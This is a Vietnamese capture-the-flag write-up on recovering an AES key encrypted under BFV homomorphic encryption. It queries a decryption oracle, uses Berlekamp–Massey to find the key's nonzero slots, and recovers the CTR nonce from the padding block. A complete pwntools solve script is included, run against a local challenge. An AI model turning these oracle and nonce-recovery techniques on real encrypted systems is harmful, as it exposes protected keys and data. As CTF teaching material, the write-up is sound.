**Berlekamp–Massey trên trường F_p.**
Ta đặt $s_i$ là các hệ số ở các slots khác 0 thì ta có công thức như sau: 

$$
s_i = [encode(M)\cdot encode(\beta_i)]_{X_0} =\sum_{j=1}^{K}  u_k \cdot a_k^j  \mod t
$$
trong đó: 
- K $\Leftarrow$ 16 
- $a_k$ = ${{\beta}'}_{ik}$ với ik là các vị trí slot khác 0 
- $u_k$ = $M[i_k]\cdot c_{ik}$ ( $c_{ik}=[encode(e_i)]_{X_0}$).

**Định lí cơ bản**: bất kỳ dãy nào là tổng của K cấp số Nhân $\sum_{j=1}^{K}   u_k \cdot a_k^j$ sẽ luôn thỏa một truy hồi tuyến tính bậc K: 
- Đa thức đặc trưng là $\prod ^K_{k=1} (X-a_k$).
- Viết ra $X^K + C_1\cdot X^{K-1}+\cdots +C_K\Rightarrow$  truy hồi đúng như trên.

Vì bật tối thiểu L=K. và chỉ cần đủ mẫu (thông lệ >=2K), BM sẽ tìm ra L và các hệ số C. 

> Và mình nghĩ tác giả để queries = 32 cũng vì điều kiện  BM: 2K >=32
>https://vi.wikipedia.org/wiki/Thu%E1%BA%ADt_to%C3%A1n_Berlekamp%E2%80%93Massey.
```python
def bm_modp(s, p):
    
    C, B = [1], [1]           
    L, m, b = 0, 1, 1         
    for n in range(len(s)):
        d = s[n] % p
        for i in range(1, L+1):
            d = (d + C[i] * s[n-i]) % p

        if d == 0:
            m += 1
        else:
            coef = (d * pow(b, -1, p)) % p
            T = C[:] + []    
            if len(C) < len(B) + m:
                C += [0] * (len(B) + m - len(C))
            for i in range(len(B)):
                C[i + m] = (C[i + m] - coef * B[i]) % p

            if 2*L <= n:
                L, B, b, m = n + 1 - L, T, d, 1
            else:
                m += 1
    return C[:L+1], L


s = [x % t for x in list_of_pt]
C, L = bm_modp(s, t)
```

```go
VD:
Found minimal polynomial of degree 16
Coefficients: [1, 89643, 25962, 39251, 153883, 127496, 170836, 161441, 78341, 41440, 188224, 23535, 83591, 30705, 57046, 109802, 135212]
```
Nên ta sẽ có Poly từ các param trên: 
- L = K = 16
- Hệ số ${C_1,\cdots,C_L}$ của đa thức đặc trưng tối thiểu: 

$$
P(X)= X^L + C_1 \cdot X^{L-1} + \cdots + C_L
$$

$\Rightarrow$ nghiệm của các P(X) là {$a_k$}


Vì ta biết được $a_k$ phải nằm trong nhóm {$r^0,\cdots,r^{N-1}$} với r là phần tử có order N trên t, nên: 
- Duyệt qua hết i=0...N-1, với $z = r^i$
- Tính P(z) modt, nếu P(z) = 0 thì z = $a_k$ và $i = i_k$ là slot

sau đó ta có ma trận như sau ( với các slot tìm được):

$$
\begin{array}{c}
	\begin{bmatrix}
1 & 1 & \cdots & 1 \\
\alpha_1 & \alpha_2 & \cdots & \alpha_K \\
\vdots & \vdots & \ddots & \vdots \\
\alpha_1^{K-1} & \alpha_2^{K-1} & \cdots & \alpha_K^{K-1}
\end{bmatrix}
\begin{bmatrix}
u_1 \\ \vdots \\ u_K
\end{bmatrix}=
\begin{bmatrix}
s_0 \\ \vdots \\ s_{K-1}
\end{bmatrix}
\pmod{t}.
\end{array}
$$


Và cuối cùng tìm $M[ik] \equiv u_k \cdot c^{-1}_{ik} \mod t$ 

```python
s = [x % t for x in list_of_pt]
C, L = bm_modp(s, t)
K = L 

assert K == 16

pow_r = [1]*degree
for i in range(1, degree):
    pow_r[i] = (pow_r[i-1] * rrr) % t
alpha_to_idx = {pow_r[i]: i for i in range(degree)}

def find_slots(C,t,pow_r,degree):
    L = len(C) - 1 
    slots = []
    for i in range(degree):
        z = pow_r[i]
        val = 0
        for j,ci in enumerate(C):
            val = (val + ci * pow(z, L-j, t)) % t
        if val == 0:
            slots.append((i,z))
    return slots
slots = find_slots(C,t,pow_r,degree)

slots = slots[:K]
s= [s % t for s in list_of_pt[:K]]
from sage.all import *
F = GF(t)
beta  = [F(z) for (i, z) in slots[:K]]
V = matrix(F, K, K, lambda j,k: beta[k]**j)
s = vector(F, s)
a = V.solve_right(s)
print("a =", list(a))


def const_coeff_of_encode_unit(idx):
    v = [0]*degree
    v[idx] = 1
    pt = sealapi.Plaintext()
    encoder.encode(v, pt)
    return pt[0] % t

indices = [i for (i, z) in slots[:K]]
const_coeff = { i: const_coeff_of_encode_unit(i) for i in indices }
print("const_coeff =", const_coeff)

M_pairs = []
for (i_k, alpha_k), uk in zip(slots[:K], a):
    c_i = Integer(const_coeff[i_k]) % t
    Mi  = (Integer(uk) * inverse_mod(c_i, t)) % t  
    M_pairs.append((i_k, int(Mi % 256)))            

M_pairs.sort()
key_bytes = bytes(b for _, b in M_pairs)
print("Recovered key (hex) =", key_bytes)
```

**Find Flag**

đoạn này hơi joke ở chỗ: 
`print("[+]", AES.new(key, AES.MODE_CTR).encrypt(pad(FLAG, 16)).hex())`
server encrypt mà không có nonce theo tính chất của mode ctr, lúc đầu mình decrypt y chang thì ko ra.
Nhưng cứ hiểu đơn giản là: 
khối cuối cùng của B_flag là: `0x10 0x10 ... 0x10 (16 byte)`

Ở CTR, mỗi Block ciphertext là: 

```python
C_i = P_i ⊕ KS_i,    với KS_i = AES-ECB(key, counter_block_i)
```
Do đó: 
```python
KS_last = C_last ⊕ P_last = C_last ⊕ (0x10 * 16)
```

vì `KS_last =AES-ECB(key, counter_block_last)`, nên;
```python
counter_block_last = AES-ECB^{-1}(key, KS_last)
```
Nên tìm được nonce là: `nonce = counter_last[:-8]   # 8 byte đầu của counter block`

>storing the nonce in the upper 64 bits and the counter in the lower 64 bits of a 128-bit counter block

![image](https://hackmd.io/_uploads/Hy8TNssyWx.png)


solve.py:
<details>
<summary>Bấm để xem chi tiết</summary>

```py
import tenseal.sealapi as sealapi
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import random, base64, os
from pwn import *

degree = 4096
plain_modulus = sealapi.PlainModulus.Batching(degree, 18)
coeff = sealapi.CoeffModulus.BFVDefault(degree, sealapi.SEC_LEVEL_TYPE.TC128)

parms = sealapi.EncryptionParameters(sealapi.SCHEME_TYPE.BFV)
parms.set_poly_modulus_degree(degree)
parms.set_plain_modulus(plain_modulus)
parms.set_coeff_modulus(coeff)

ctx = sealapi.SEALContext(parms, True, sealapi.SEC_LEVEL_TYPE.TC128)
encoder = sealapi.BatchEncoder(ctx)
evaluator = sealapi.Evaluator(ctx)
t = plain_modulus.value()


# r = process(['python3', 'chall.py'],level='debug')
r = process(['python3', 'chall.py'])


resp = r.recvuntil(b'[enc] ')
key_enc_b64 = r.recvline().decode().strip()
key_enc_data = base64.b64decode(key_enc_b64)
open("key_enc", 'wb').write(key_enc_data)
key_enc = sealapi.Ciphertext(ctx)
key_enc.load(ctx, "key_enc")

from tqdm import tqdm
omega = ctx.first_context_data().plain_ntt_tables().get_root()

rrr = pow(omega,2, t)
list_of_pt= []
for i in tqdm(range(32)):

    r.recvuntil('[?] ')
    r.sendline('D')
    r.recvuntil('[b64] ')

    beta = [1]*degree
    rj = pow(rrr, i, t)
    for j in range(1,degree):
        beta[j] = (beta[j-1] * rj) % t

    beta_pt = sealapi.Plaintext()
    encoder.encode(beta, beta_pt)
    ct = sealapi.Ciphertext()
    evaluator.multiply_plain(key_enc, beta_pt, ct)
    ct.save("ct")
    b64_send = base64.b64encode(open("ct",'rb').read()).decode()
    r.sendline(b64_send.encode())
    r.recvuntil('[*] ')
    dec0 = (r.recvline().decode().strip())
    list_of_pt.append(int(dec0))

r.recvuntil('[+]')
cipher_server = r.recvline().decode().strip()
cipher_server = bytes.fromhex(cipher_server)



def bm_modp(s, p):
    
    C, B = [1], [1]           
    L, m, b = 0, 1, 1         
    for n in range(len(s)):
        d = s[n] % p
        for i in range(1, L+1):
            d = (d + C[i] * s[n-i]) % p

        if d == 0:
            m += 1
        else:
            coef = (d * pow(b, -1, p)) % p
            T = C[:] + []    
            if len(C) < len(B) + m:
                C += [0] * (len(B) + m - len(C))
            for i in range(len(B)):
                C[i + m] = (C[i + m] - coef * B[i]) % p

            if 2*L <= n:
                L, B, b, m = n + 1 - L, T, d, 1
            else:
                m += 1
    return C[:L+1], L


s = [x % t for x in list_of_pt]
C, L = bm_modp(s, t)
K = L 

assert K == 16

pow_r = [1]*degree
for i in range(1, degree):
    pow_r[i] = (pow_r[i-1] * rrr) % t
alpha_to_idx = {pow_r[i]: i for i in range(degree)}

def find_slots(C,t,pow_r,degree):
    L = len(C) - 1 
    slots = []
    for i in range(degree):
        z = pow_r[i]
        val = 0
        for j,ci in enumerate(C):
            val = (val + ci * pow(z, L-j, t)) % t
        if val == 0:
            slots.append((i,z))
    return slots
slots = find_slots(C,t,pow_r,degree)

slots = slots[:K]
s= [s % t for s in list_of_pt[:K]]
from sage.all import *
F = GF(t)
beta  = [F(z) for (i, z) in slots[:K]]
V = matrix(F, K, K, lambda j,k: beta[k]**j)
s = vector(F, s)
a = V.solve_right(s)
print("u =", list(a))


def const_coeff_of_encode_unit(idx):
    v = [0]*degree
    v[idx] = 1
    pt = sealapi.Plaintext()
    encoder.encode(v, pt)
    return pt[0] % t

indices = [i for (i, z) in slots[:K]]
const_coeff = { i: const_coeff_of_encode_unit(i) for i in indices }
print("const_coeff =", const_coeff)

M_pairs = []
for (i_k, alpha_k), uk in zip(slots[:K], a):
    c_i = Integer(const_coeff[i_k]) % t
    Mi  = (Integer(uk) * inverse_mod(c_i, t)) % t  
    M_pairs.append((i_k, int(Mi % 256)))            

M_pairs.sort()
key_bytes = bytes(b for _, b in M_pairs)
print("Recovered key (hex) =", key_bytes)


nonce = AES.new(key_bytes, AES.MODE_ECB).decrypt(xor(cipher_server[-16:],b'\x10'*16))[:-8]
cipher = AES.new(key_bytes, AES.MODE_CTR, nonce=nonce)

flag = cipher.decrypt(cipher_server)
print("FLAG =", flag)
```

</details>
## References

[1] wiki
[2] https://github.com/thewhiteninja/lfsr-berlekamp-massey
[3] trong blog kia đã đề cập
[4] Gemini, GPT.
